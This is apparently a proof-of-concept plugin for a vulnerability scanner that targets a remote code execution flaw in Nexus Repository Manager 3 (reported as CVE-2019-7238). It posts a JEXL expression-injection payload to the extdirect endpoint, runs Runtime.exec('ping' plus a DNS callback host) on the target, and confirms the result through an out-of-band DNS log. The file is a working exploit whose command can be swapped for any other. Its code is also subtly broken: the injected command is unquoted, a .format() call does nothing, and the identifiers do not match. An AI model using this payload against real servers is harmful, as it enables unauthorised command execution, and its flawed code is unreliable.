#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import asyncio
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'Nexus3 RCE'
        self.keyword = ['Nexus3']
        self.info = 'nexus3 rce'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.base_url, '/nexus3/'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    url = path + 'service/extdirect'
                    headers = {"Content-Type": "application/json"}
                    dns = self.ceye_dns_api(k='cve20197328',t='dns')
                    cmd = 'ping ' + dns
                    data = '{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":25,"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"1.class.forName(\'java.lang.Runtime\').getRuntime().exec('+ cmd +').waitFor()".format(self.BANNER, self.DOMAIN)},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":4}'
                    async with session.post(url=url, json = data, headers=headers) as res:
                        await asyncio.sleep(1)
                        if await self.ceye_verify_api(dns, t='dns'):
                            self.flag = 1
                            self.res.append({"info": url, "key": "CVE-2019-7238"})
                            return


